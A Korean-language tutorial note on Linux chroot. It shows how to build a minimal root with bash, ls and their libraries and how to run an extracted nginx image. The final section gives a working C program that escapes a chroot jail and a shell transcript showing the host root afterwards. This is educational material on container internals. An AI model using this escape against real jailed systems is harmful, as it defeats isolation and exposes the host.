# chroot

- chroot 로  root-path를 새로 지정하여 마치 새로운 파일 시스템 처럼 사용할 수 있다.



### chroot (change root directory "/")

- FTP 등 시용 시 특정 디렉토리로 이동권한을 제한하기 위한 용도로 사용
- $ chroot "실행경로" "실행명령어" 
  - 실행명령어 default는 /bin/sh
  - 실행 명령어는 실행경로 내부에 실행파일이 존재해야 함
- 제한한다를 이용하여 컨테이너처럼 root를 지정해 사용해 보자.



### chroot 접근

-  bash 실행이 실패하는 이유는 새로만든 폴더 내에 아무런 실행 파일 이 없기 때문이다.

~~~sh
mkdir tmp-root
chroot tmp-root /bin/bash
chroot: failed to run command ‘/bin/bash’: No such file or directory
~~~



### bash program 실행

- 실행파일 을 복사해 넣고
- 실행시 런타임에 참조하는 의존성 라이브러리들도 복사해 넣는다.

~~~sh
mkdir tmp-root
chroot tmp-root /bin/bash
chroot: failed to run command ‘/bin/bash’: No such file or directory

chroot tmp-root /bin.bash

which bash
mkdir -p tmp-root/bin
cp /bin/bash tmp-root/bin


# ldd: 런타임에 참조하는 의존성 라이브러리 파일
ldd /bin/bash
root@seongtki:/# ldd /bin/bash
	linux-vdso.so.1 (0x00007fff7e9df000)
	libtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007f470948c000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4709288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4708e97000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f47099d0000)


/# mkdir -p tmp-root/lib
/# cp /lib/x86_64-linux-gnu/libtinfo.so.5 tmp-root/lib/
/# cp /lib/x86_64-linux-gnu/libdl.so.2 tmp-root/lib/
/# cp /lib/x86_64-linux-gnu/libc.so.6 tmp-root/lib/
/# mkdir -p tmp-root/lib64
/# cp /lib64/ld-linux-x86-64.so.2 tmp-root/lib64/

/# cp /bin/bash tmp-root/bin/

# bash 접근 성공
/# chroot tmp-root /bin/bash
bash-4.4# exit
~~~



### ls program 실행

- bash와 같은 방식으로 진행한다.

~~~sh
/# which ls
/bin/ls
/# cp /bin/ls /tmp-root/bin/
/# ldd /bin/ls
	linux-vdso.so.1 (0x00007fff86f61000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f1d3d9a0000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1d3d5af000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f1d3d33e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f1d3d13a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f1d3ddea000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f1d3cf1b000)

/# cp /lib/x86_64-linux-gnu/libselinux.so.1 tmp-root/lib/
/# cp /lib/x86_64-linux-gnu/libc.so.6 tmp-root/lib/
/# cp /lib/x86_64-linux-gnu/libpcre.so.3 tmp-root/lib/
/# cp /lib/x86_64-linux-gnu/libdl.so.2 tmp-root/lib/
/# cp /lib64/ld-linux-x86-64.so.2 tmp-root/lib64/
/# cp /lib/x86_64-linux-gnu/libpthread.so.0 tmp-root/lib/
/# chroot tmp-root /bin/bash

# ls 실행 성공
bash-4.4# ls
bin  lib  lib64
~~~

- 새로운 파일시스템의 파일구조

~~~sh
root@seongtki:/# tree -L 2 tmp-root/
tmp-root/
├── bin
│   ├── a.out
│   ├── bash
│   └── ls
├── lib
│   ├── libc.so.6
│   ├── libdl.so.2
│   ├── libpcre.so.3
│   ├── libpthread.so.0
│   ├── libselinux.so.1
│   └── libtinfo.so.5
└── lib64
    └── ld-linux-x86-64.so.2
~~~



### 이미 만들어진 이미지로 chroot 접속

- nginx image tarball

~~~sh
cd /
mkdir /nginx-root

docker export $(docker create nginx) | tar -C /nginx-root -xvf -
chroot nginx-root /bin/sh
nginx -g "daemon off;"

curl localhost # 다른 쉘에서 접속
~~~

- 실제 컨테이너 처럼 프로그램 실행에 필요한 파일들을 모아놓고
- 해당 경로를 root로 설정한 뒤 프로세스를 실행.

~~~sh
# 해딩 image는 이미 사용할 lib, bin 파일이 모두 존재한다.
/# ll
total 84
drwxr-xr-x 16 root root  4096 Sep 20 16:43 ./
drwxr-xr-x 14 root root  4096 Sep 19 00:00 ../
drwxr-xr-x  5 root root  4096 Sep 19 00:00 apt/
drwxr-xr-x  3 root root  4096 May 25 14:11 dpkg/
drwxr-xr-x  2 root root  4096 Sep 19 00:00 init/
drwxr-xr-x  3 root root  4096 Jul 13 18:07 locale/
drwxr-xr-x  3 root root  4096 Sep 19 00:00 lsb/
drwxr-xr-x  3 root root  4096 Apr  6 14:25 mime/
drwxr-xr-x  3 root root  4096 Sep 20 16:43 nginx/
-rw-r--r--  1 root root   267 Jul 14 16:00 os-release
drwxr-xr-x  2 root root  4096 Nov 22  2022 sasl2/
drwxr-xr-x  3 root root  4096 Sep 20 16:43 ssl/
drwxr-xr-x  3 root root  4096 May 25 14:11 systemd/
drwxr-xr-x 16 root root  4096 May  7 14:33 terminfo/
drwxr-xr-x  2 root root  4096 Sep 19 00:00 tmpfiles.d/
drwxr-xr-x  3 root root  4096 Sep 19 00:00 udev/
drwxr-xr-x 10 root root 20480 Sep 20 16:43 x86_64-linux-gnu/
~~~



### root 권한 취득

- chroot 내에서는 root 디렉토리를 빠져나올 수 없다.

~~~sh
cd /
ls
cd ../../../
ls
~~~

- 프로그램을 통해 root를 빠져나올 수 있다.

~~~c
#include <sys/stat.h>
#include <unistd.h>

int main(void)
{
    mkdir("escape", 0755);
    chroot("escape");
    chdir("../../");
    chroot(".");
    return execl("/bin/sh", "-i", NULL);
}
~~~

- 원래 root 디렉토리가 조회가 됨.

~~~sh
root@seongtki:/# chroot tmp-root /bin/bash
bash-4.4# a.out
# ls
a.out  cdrom	 etc	     initrd.img.old  lost+found  opt   run   srv       tmp	 var
bin    dev	 home	     lib	     media	 proc  sbin  swap.img  tmp-root  vmlinuz
boot   escape.c  initrd.img  lib64	     mnt	 root  snap  sys       usr	 vmlinuz.old
~~~





















